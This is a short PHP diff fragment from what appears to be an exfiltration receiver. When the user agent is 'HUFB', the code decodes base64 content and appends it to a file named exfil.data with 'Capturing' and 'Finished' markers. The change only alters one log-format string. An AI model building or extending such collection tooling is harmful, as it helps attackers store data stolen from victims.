@@ -8,7 +8,7 @@ if ($user_agent == 'HUFB') {
 	$file = '/home/ubuntu/data/exfil.data';
 	$saved_file = fopen($file, 'a');
 	$decoded = base64_decode($content);
-	$begin = $source . ' : ' . $host . ' - Capturing';
+	$begin = $source . '/' . $host . ' - Capturing';
 	$end = $source . ' - Finished';
 	fwrite($saved_file, $begin);
 	fwrite($saved_file, "\n");
